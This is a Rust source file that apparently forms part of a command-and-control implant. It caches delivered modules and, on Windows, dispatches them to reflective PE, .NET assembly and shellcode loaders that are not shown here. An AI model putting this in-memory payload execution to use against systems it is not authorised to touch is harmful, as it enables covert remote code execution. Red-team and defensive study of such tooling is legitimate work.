use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use once_cell::sync::Lazy;
use common::packets::{ModuleData, ModuleExecution, ModuleExecutionResult, ModuleType};

#[cfg(target_os = "windows")]
use crate::features::reflective_loader;
#[cfg(target_os = "windows")]
use crate::features::dotnet_loader;

/// Global module cache
static MODULE_CACHE: Lazy<Arc<Mutex<HashMap<String, ModuleData>>>> = Lazy::new(|| {
    Arc::new(Mutex::new(HashMap::new()))
});

/// Load a module into memory cache
pub fn load_module(module: ModuleData) -> Result<(), String> {
    let mut cache = MODULE_CACHE.lock().map_err(|e| format!("Failed to lock cache: {}", e))?;
    
    // Validate module data
    if module.data.is_empty() {
        return Err("Module data is empty".to_string());
    }
    
    println!("Loading module: {} (type: {:?}, size: {} bytes)", 
             module.name, module.module_type, module.data.len());
    
    cache.insert(module.id.clone(), module);
    Ok(())
}

/// Execute a loaded module
pub async fn execute_module(execution: ModuleExecution) -> ModuleExecutionResult {
    // Get module from cache
    let module = {
        let cache = match MODULE_CACHE.lock() {
            Ok(cache) => cache,
            Err(e) => {
                return ModuleExecutionResult {
                    module_id: execution.module_id,
                    success: false,
                    output: String::new(),
                    error: format!("Failed to lock module cache: {}", e),
                    exit_code: -1,
                };
            }
        };
        
        match cache.get(&execution.module_id) {
            Some(m) => m.clone(),
            None => {
                return ModuleExecutionResult {
                    module_id: execution.module_id,
                    success: false,
                    output: String::new(),
                    error: "Module not found in cache".to_string(),
                    exit_code: -1,
                };
            }
        }
    };
    
    println!("Executing module: {} with args: {:?}", module.name, execution.args);
    
    // Execute based on module type
    #[cfg(target_os = "windows")]
    {
        match module.module_type {
            ModuleType::PE => {
                reflective_loader::execute_pe_module(&module, &execution).await
            }
            ModuleType::DotNetAssembly => {
                dotnet_loader::execute_dotnet_assembly(&module, &execution).await
            }
            ModuleType::Shellcode => {
                reflective_loader::execute_shellcode(&module, &execution).await
            }
        }
    }
    
    #[cfg(not(target_os = "windows"))]
    {
        ModuleExecutionResult {
            module_id: execution.module_id,
            success: false,
            output: String::new(),
            error: "Module execution only supported on Windows".to_string(),
            exit_code: -1,
        }
    }
}

/// Unload a module from memory
pub fn unload_module(module_id: &str) -> Result<(), String> {
    let mut cache = MODULE_CACHE.lock().map_err(|e| format!("Failed to lock cache: {}", e))?;
    
    if cache.remove(module_id).is_some() {
        println!("Unloaded module: {}", module_id);
        Ok(())
    } else {
        Err("Module not found".to_string())
    }
}

/// List all loaded modules
pub fn list_modules() -> Vec<String> {
    match MODULE_CACHE.lock() {
        Ok(cache) => cache.keys().cloned().collect(),
        Err(_) => Vec::new(),
    }
}

/// Clear all modules from cache
pub fn clear_all_modules() {
    if let Ok(mut cache) = MODULE_CACHE.lock() {
        cache.clear();
        println!("Cleared all modules from cache");
    }
}
